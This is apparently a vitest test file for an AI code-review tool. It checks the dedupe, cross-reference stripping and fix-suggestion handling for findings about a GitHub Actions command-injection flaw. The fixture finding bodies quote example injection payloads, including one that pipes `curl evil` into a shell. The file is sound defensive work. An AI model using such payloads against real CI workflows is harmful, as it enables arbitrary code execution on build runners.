import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Finding } from "@omniralph/shared";
import { parse as parseYaml } from "yaml";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { completes, dedupeFindings } from "./dedupe.js";
import { parseDiff } from "./diff.js";
import type { ReviewConfig } from "./prompt.js";
import type { ReviewProvider, ReviewRequest, TaskReviewResult } from "./providers/types.js";
import { runReview } from "./runReview.js";
import {
  downgradeSuggestion,
  stripCrossReferences,
  undefinedSuggestionVariables,
  variableReferences,
  workflowEnvAt,
} from "./selfContained.js";

// mcm/omniralph-sandbox#1 (TOOL-56 live check; #2 at 9fda7a9 has the same base, head and diff): a new "Publish coverage summary"
// step (lines 90-94, no `env:`) expands the PR title in `run:` (93) and reads a
// coverage-summary.json nothing produces (94); a new upload step pins a tag (97).
const fixture = (name: string) =>
  readFileSync(new URL(`../test/fixtures/sandbox-pr1/${name}`, import.meta.url), "utf8");
const BASE = fixture("base.yml");
const HEAD = fixture("head.yml");
const PR_DIFF = fixture("pr.diff");
const PATH = ".github/workflows/ci.yml";

/** The findings that review posted, verbatim. */
const injection: Finding = {
  path: PATH,
  startLine: 93,
  endLine: 93,
  severity: "high",
  category: "security",
  title: "Untrusted PR title expanded directly in run script",
  body: '`${{ github.event.pull_request.title }}` is pasted into the shell script before the shell runs. A PR title containing `"; curl ... #` or `$(...)` runs arbitrary commands in the job. Fork PRs can trigger this. Pass the title through `env:` and quote the variable.',
  suggestion: '          echo "### Coverage for: ${PR_TITLE}" >> "$GITHUB_STEP_SUMMARY"',
  confidence: 0.9,
};
const coverage: Finding = {
  path: PATH,
  startLine: 90,
  endLine: 94,
  severity: "high",
  category: "correctness",
  title: "coverage-summary.json is never produced",
  body: 'The step reads `coverage/coverage-summary.json`. `vitest.config.ts` sets the coverage reporters to `["text", "lcov"]`, and `test:coverage` is `vitest run --coverage`. No earlier step writes that file, because it needs the `json-summary` reporter. `require` throws MODULE_NOT_FOUND on every pull request, so the Unit Tests job fails. Because `build` depends on `test`, the build is skipped too. Add `"json-summary"` to the reporters in `vitest.config.ts`. The `PR_TITLE` env mapping for the title finding also belongs on this step.',
  confidence: 0.85,
};
const pinning: Finding = {
  path: PATH,
  startLine: 97,
  endLine: 97,
  severity: "medium",
  category: "security",
  title: "upload-artifact pinned to a mutable tag",
  body: "The file header says all actions are pinned to full commit SHAs, and every other `uses:` line is. `actions/upload-artifact@v4` is a mutable tag, which is a supply-chain risk. Pin it to the commit SHA and keep the tag in a trailing comment.",
  confidence: 0.9,
};

/** The step at 90-94 rewritten with the title in `env:`: the complete fix. */
const FIXED_STEP = [
  "      - name: Publish coverage summary",
  "        if: github.event_name == 'pull_request'",
  "        env:",
  "          PR_TITLE: ${{ github.event.pull_request.title }}",
  "        run: |",
  '          echo "### Coverage for: ${PR_TITLE}" >> "$GITHUB_STEP_SUMMARY"',
  "          node -e 'const s = require(\"./coverage/coverage-summary.json\").total; for (const [k, v] of Object.entries(s)) console.log(`- ${k}: ${v.pct}%`)' >> \"$GITHUB_STEP_SUMMARY\"",
].join("\n");

/** What "Commit suggestion" does: replace exactly startLine..endLine. */
function apply(text: string, finding: Finding): string {
  const lines = text.split("\n");
  lines.splice(finding.startLine - 1, finding.endLine - finding.startLine + 1, ...finding.suggestion!.split("\n"));
  return lines.join("\n");
}

describe("cross-references between findings", () => {
  it("drops the sentence that points at another finding and keeps the rest", () => {
    const stripped = stripCrossReferences(coverage);
    expect(stripped.body).not.toMatch(/finding/i);
    expect(stripped.body).not.toContain("PR_TITLE");
    expect(stripped.body).toBe(coverage.body.replace(/ The `PR_TITLE`.*$/, ""));
  });

  it.each([
    "See the other finding for the fix.",
    "This is the same root cause as the injection finding above.",
    "Fixing the finding on line 12 also fixes this.",
  ])("recognizes %j", (sentence) => {
    expect(stripCrossReferences({ ...injection, body: `Real problem. ${sentence}` }).body).toBe(
      "Real problem.",
    );
  });

  it("leaves bodies without cross-references, code blocks and lone references alone", () => {
    expect(stripCrossReferences(injection)).toBe(injection);
    const code = { ...injection, body: "Problem.\n\n```\n# see the other finding\n```" };
    expect(stripCrossReferences(code)).toBe(code);
    const domain = { ...injection, body: "`dedupeFindings` returns findings unsorted, so the summary order changes." };
    expect(stripCrossReferences(domain)).toBe(domain);
    const only = { ...injection, body: "See the other finding." };
    expect(stripCrossReferences(only)).toBe(only);
  });
});

describe("workflow suggestions that use undefined variables", () => {
  it("finds variable references, ignoring single quotes and defaults", () => {
    expect([...variableReferences('echo "${A} $B ${C:-x} $$" \'$D ${E}\' ${{ github.ref }}')]).toEqual(["A", "B"]);
  });

  it("collects the step, job and workflow env that apply at a line", () => {
    // Step 90-94 has no env; the sibling step's `CI` (87-88) does not apply.
    expect([...workflowEnvAt(HEAD, 93)].sort()).toEqual(["NODE_VERSION", "PNPM_VERSION"]);
    expect(workflowEnvAt(HEAD, 86).has("CI")).toBe(true);
    const yaml = [
      "jobs:",
      "  a:",
      "    env:",
      "      JOB_VAR: 1",
      "    steps:",
      "      - name: one",
      "        env: { STEP_VAR: x }",
      "        run: echo $STEP_VAR",
      "      - name: two",
      "        run: echo $JOB_VAR",
    ].join("\n");
    expect([...workflowEnvAt(yaml, 8)].sort()).toEqual(["JOB_VAR", "STEP_VAR"]);
    expect([...workflowEnvAt(yaml, 10)]).toEqual(["JOB_VAR"]);
    expect([...workflowEnvAt(yaml, 9)]).toEqual(["JOB_VAR"]);
  });

  it("flags the live injection suggestion: PR_TITLE is defined nowhere", () => {
    expect(undefinedSuggestionVariables(injection, HEAD)).toEqual(["PR_TITLE"]);
    // Applying it removes the injection but prints an empty title.
    expect(apply(HEAD, injection)).not.toMatch(/PR_TITLE:/);
  });

  it("accepts the whole step with the env mapping, and applying it fixes the step", () => {
    const widened = { ...injection, startLine: 90, endLine: 94, suggestion: FIXED_STEP };
    expect(undefinedSuggestionVariables(widened, HEAD)).toEqual([]);
    const fixed = apply(HEAD, widened).split("\n");
    expect(fixed.slice(89, 96)).toEqual(FIXED_STEP.split("\n"));
    expect(fixed.join("\n")).not.toContain("${{ github.event.pull_request.title }}\"");
  });

  it("accepts variables the runner, the file or the original lines already define", () => {
    const quoted = { ...injection, suggestion: '          echo "### Coverage" >> "$GITHUB_STEP_SUMMARY"' };
    expect(undefinedSuggestionVariables(quoted, HEAD)).toEqual([]);
    const workflowEnv = { ...injection, suggestion: '          echo "node $NODE_VERSION"' };
    expect(undefinedSuggestionVariables(workflowEnv, HEAD)).toEqual([]);
    const assigned = { ...injection, suggestion: '          t="x"; echo "$t"' };
    expect(undefinedSuggestionVariables(assigned, HEAD)).toEqual([]);
    const { suggestion: _none, ...noSuggestion } = injection;
    expect(undefinedSuggestionVariables(noSuggestion, HEAD)).toEqual([]);
  });

  it("downgrades an incomplete suggestion into a body that describes the whole fix", () => {
    const downgraded = downgradeSuggestion(injection, ["PR_TITLE"]);
    expect(downgraded.suggestion).toBeUndefined();
    expect(downgraded.body.startsWith(injection.body)).toBe(true);
    expect(downgraded.body).toContain("`PR_TITLE`");
    expect(downgraded.body).toContain("step's `env:`");
    expect(downgraded.body).toContain(`\`\`\`\n${injection.suggestion}\n\`\`\``);
  });
});

describe("merging a fragment into the finding it completes", () => {
  // The live bug: the "add the env mapping" part landed in the coverage finding
  // on the same step (another category) instead of the injection finding.
  const fragment: Finding = {
    path: PATH,
    startLine: 91,
    endLine: 92,
    severity: "medium",
    category: "correctness",
    title: "The step never sets PR_TITLE",
    body: "Add `env: PR_TITLE: ${{ github.event.pull_request.title }}` to this step so the title reaches the script.",
    confidence: 0.8,
  };
  const cleanCoverage = stripCrossReferences(coverage);

  it("merges 'add the env mapping' into the injection, not the coverage finding on the same step", () => {
    const { findings, suppressed } = dedupeFindings([cleanCoverage, injection, fragment, pinning]);
    expect(suppressed).toEqual([fragment]);
    expect(findings).toHaveLength(3);
    expect(findings[0]).toBe(cleanCoverage);
    expect(findings[1]).toMatchObject({
      title: injection.title,
      category: "security",
      severity: "high",
      startLine: 91,
      endLine: 93,
    });
    expect(findings[1]!.suggestion).toBeUndefined();
    expect(findings[1]!.body).toContain("Also (lines 91-92): The step never sets PR_TITLE.");
    expect(findings[1]!.body).toContain(`Suggested change for line 93:\n\`\`\`\n${injection.suggestion}`);
    expect(findings[2]).toBe(pinning);
  });

  it("merges either way round, and only fragments that supply a variable", () => {
    expect(completes(fragment, injection)).toBe(true);
    expect(completes(fragment, cleanCoverage)).toBe(false);
    expect(completes(injection, fragment)).toBe(false);
    const reversed = dedupeFindings([fragment, cleanCoverage, injection]);
    expect(reversed.findings.map((f) => f.title)).toEqual([coverage.title, injection.title]);
    expect(reversed.findings[1]).toMatchObject({ startLine: 91, endLine: 93 });
    // Different categories on one step stay apart when neither completes the other.
    expect(dedupeFindings([cleanCoverage, injection]).findings).toEqual([cleanCoverage, injection]);
  });
});

/** Temp repo with the sandbox PR's base and head commits. */
class Repo {
  readonly dir = mkdtempSync(join(tmpdir(), "omniralph-pr1-"));
  git(...args: string[]): string {
    return execFileSync("git", args, {
      cwd: this.dir,
      encoding: "utf8",
      env: {
        ...process.env,
        GIT_CONFIG_GLOBAL: "/dev/null",
        GIT_CONFIG_NOSYSTEM: "1",
        GIT_AUTHOR_NAME: "Test",
        GIT_AUTHOR_EMAIL: "test@example.com",
        GIT_COMMITTER_NAME: "Test",
        GIT_COMMITTER_EMAIL: "test@example.com",
      },
    }).trim();
  }
  commit(content: string, message: string): string {
    mkdirSync(join(this.dir, ".github/workflows"), { recursive: true });
    writeFileSync(join(this.dir, PATH), content);
    this.git("add", "-A");
    this.git("commit", "-q", "-m", message);
    return this.git("rev-parse", "HEAD");
  }
}

class FakeProvider implements ReviewProvider {
  readonly requests: ReviewRequest[] = [];
  constructor(private readonly findings: Finding[]) {}
  async review(request: ReviewRequest): Promise<TaskReviewResult> {
    this.requests.push(request);
    return {
      findings: this.findings,
      usage: { inputTokens: 30_000, outputTokens: 2_000 },
      stopReason: "completed",
      discarded: { invalid: 0, outsideDiff: 0 },
    };
  }
}

const config: ReviewConfig = {
  profile: {
    id: "standard",
    name: "Standard",
    maxTokensPerReview: 200_000,
    maxFiles: 40,
    allowRepoExploration: true,
  },
};

describe("runReview on mcm/omniralph-sandbox#1", () => {
  let repo: Repo;
  let baseSha: string;
  let headSha: string;
  const quietLogger = { info: () => {}, warn: () => {} };

  beforeAll(() => {
    repo = new Repo();
    repo.git("init", "-q", "-b", "main");
    baseSha = repo.commit(BASE, "base");
    headSha = repo.commit(HEAD, "ci: publish coverage summary and upload the coverage report");
  });
  afterAll(() => rmSync(repo.dir, { recursive: true, force: true }));

  const review = (findings: Finding[]) => {
    const provider = new FakeProvider(findings);
    return runReview(
      {
        cwd: repo.dir,
        baseSha,
        headSha,
        reviewConfig: config,
        changeRequest: { title: "ci: publish coverage summary and upload the coverage report" },
      },
      { provider, logger: quietLogger },
    ).then((result) => ({ result, provider }));
  };

  it("reviews exactly the PR's diff", async () => {
    const { provider } = await review([]);
    expect(provider.requests[0]!.task.files.map((f) => f.hunks)).toEqual(
      parseDiff(PR_DIFF).map((f) => f.hunks),
    );
  });

  it("posts one self-contained injection finding and a coverage finding without a cross-reference", async () => {
    const { result } = await review([injection, coverage, pinning]);
    expect(result.findings).toHaveLength(3);

    const [inj, cov, pin] = result.findings;
    // The incomplete one-click fix is gone; the body carries the whole fix.
    expect(inj).toMatchObject({ title: injection.title, startLine: 93, endLine: 93 });
    expect(inj!.suggestion).toBeUndefined();
    expect(inj!.body).toContain("Pass the title through `env:`");
    expect(inj!.body).toContain("`PR_TITLE`");
    expect(inj!.body).toContain("step's `env:`");

    expect(cov!.title).toBe(coverage.title);
    expect(cov!.body).not.toMatch(/finding/i);
    expect(cov!.body).not.toContain("PR_TITLE");
    expect(cov!.body).toContain("json-summary");

    expect(pin).toEqual(pinning);
    for (const f of result.findings) {
      expect(`${f.title} ${f.body}`).not.toMatch(/\b(?:the|other|another) \w* ?finding\b/i);
    }
  });

  it("keeps a complete whole-step suggestion as is", async () => {
    const widened = { ...injection, startLine: 90, endLine: 94, suggestion: FIXED_STEP };
    const { result } = await review([widened, { ...coverage, body: stripCrossReferences(coverage).body }]);
    expect(result.findings[0]).toEqual(widened);
    expect(apply(HEAD, result.findings[0]!)).toContain("PR_TITLE: ${{ github.event.pull_request.title }}");
  });

  it("fits the live #2 whole-step suggestion anchored at 92-94 to the step at 90-94", async () => {
    // mcm/omniralph-sandbox#2 (TOOL-59): the suggestion is the complete step,
    // but the comment was anchored to `run:`..`node` only.
    const live: Finding = {
      path: PATH,
      startLine: 92,
      endLine: 94,
      severity: "high",
      category: "security",
      title: "Untrusted PR title expanded directly in run script (command injection)",
      body: '`${{ github.event.pull_request.title }}` is pasted into the shell script before the shell runs. A PR title containing `"; curl evil | sh; echo "` runs arbitrary commands on the runner. The step runs on `pull_request` events, including ones from forks. Pass the title through `env:` and quote the variable.',
      suggestion: FIXED_STEP.replace("${PR_TITLE}", "$PR_TITLE"),
      confidence: 0.95,
    };
    const liveCoverage: Finding = { ...coverage, startLine: 94, endLine: 94, body: stripCrossReferences(coverage).body };
    const { result } = await review([live, liveCoverage, pinning]);

    const inj = result.findings.find((f) => f.category === "security" && f.startLine < 97)!;
    expect(inj).toMatchObject({ startLine: 90, endLine: 94, suggestion: live.suggestion });

    // Applying it ("Commit suggestion") gives one valid step with the env mapping.
    const fixed = apply(HEAD, inj);
    expect(fixed.match(/- name: Publish coverage summary/g)).toHaveLength(1);
    expect(fixed.match(/if: github\.event_name == 'pull_request'\n/g)).toHaveLength(1);
    const workflow = parseYaml(fixed) as {
      jobs: Record<string, { steps: { name?: string; if?: string; env?: Record<string, string>; run?: string; uses?: string }[] }>;
    };
    const step = Object.values(workflow.jobs)
      .flatMap((job) => job.steps)
      .find((s) => s.name === "Publish coverage summary")!;
    expect(step).toEqual({
      name: "Publish coverage summary",
      if: "github.event_name == 'pull_request'",
      env: { PR_TITLE: "${{ github.event.pull_request.title }}" },
      run: expect.stringContaining('echo "### Coverage for: $PR_TITLE"'),
    });
    // No step is left with only `name`/`if` (GitHub rejects a step without `run` or `uses`).
    for (const s of Object.values(workflow.jobs).flatMap((job) => job.steps)) {
      expect(s.run ?? s.uses).toBeDefined();
    }
  });
});
